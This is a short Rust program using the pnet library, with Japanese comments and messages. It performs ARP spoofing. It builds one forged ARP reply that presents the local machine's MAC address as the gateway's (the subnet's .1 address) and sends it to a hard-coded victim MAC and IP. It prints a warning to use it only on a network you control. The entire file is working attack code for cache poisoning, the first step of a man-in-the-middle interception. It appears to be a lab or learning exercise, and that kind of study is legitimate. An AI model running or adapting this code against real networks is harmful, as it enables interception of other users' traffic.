use pnet::datalink::{self, NetworkInterface};
use pnet::packet::arp::{ArpPacket, MutableArpPacket, ArpOperation};
use pnet::packet::ethernet::{EthernetPacket, MutableEthernetPacket};
use pnet::packet::{Packet, MutablePacket};
use std::net::{Ipv4Addr, IpAddr};
use std::env;

fn main() {

    println!("ARPスプーフィングを実行します。");
    println!("これは実験的な用途であり、自分の管理下のネットワークで実験的目的にのみ使用してください。");
    println!("ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー");
    // ネットワークインターフェースを取得
    let interface = datalink::interfaces().into_iter()
        .find(|iface: &NetworkInterface| iface.is_up() && !iface.is_loopback() && iface.is_broadcast())
        .expect("利用可能なネットワークインターフェースが見つかりませんでした");

    // インターフェース名を取得
    let interface_name = &interface.name;
    println!("使用するインターフェース: {}", interface_name);

    // 生のソケットを作成
    let mut config = datalink::Config::default();
    config.read_timeout = Some(std::time::Duration::from_secs(1));
    let (mut tx, mut rx) = match datalink::channel(&interface, config) {
        Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Raw Ethernet channelの作成に失敗しました。"),
        Err(e) => panic!("エラー: {}", e),
    };

    println!("ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー");

    // パケットデータのバッファを準備
    let mut ethernet_buffer = [0u8; 42];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

    // イーサネットヘッダの組み立て
    ethernet_packet.set_destination(pnet::datalink::MacAddr(0xbc, 0x24, 0x11, 0x91, 0xc9, 0xf6));
    ethernet_packet.set_source(interface.mac.unwrap());
    ethernet_packet.set_ethertype(pnet::packet::ethernet::EtherTypes::Arp);

    // ARPパケットのバッファを準備
    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();

    // ARPヘッダの組み立て
    arp_packet.set_hardware_type(pnet::packet::arp::ArpHardwareType::new(1));
    arp_packet.set_protocol_type(pnet::packet::ethernet::EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperation::new(2)); // リクエスト 1, アンサー 2
    arp_packet.set_sender_hw_addr(interface.mac.unwrap());
    arp_packet.set_sender_proto_addr(
    interface.ips
        .iter()
        .find_map(|ip_network| {
            match ip_network.ip() {
                IpAddr::V4(v4) => {
                    // 最後のオクテットだけ 1 にする
                    let mut octets = v4.octets();
                    octets[3] = 1;
                    Some(Ipv4Addr::from(octets))
                }
                IpAddr::V6(_) => None,
            }
        }
        )
        .unwrap()
    );
    arp_packet.set_target_hw_addr(pnet::datalink::MacAddr(0xbc, 0x24, 0x11, 0x91, 0xc9, 0xf6));//宛先のmacアドレス
    let target_ip: Ipv4Addr = Ipv4Addr::from([192, 168, 10, 105]); //宛先のIP
    arp_packet.set_target_proto_addr(target_ip);

    // ARPパケットをイーサネットパケットのペイロードに格納
    ethernet_packet.set_payload(arp_packet.packet_mut());

    // パケットを送信
    tx.send_to(ethernet_packet.packet(), None).unwrap().unwrap();
    println!("ARPスプーフィングを実行しています。宛先: {}", target_ip);
}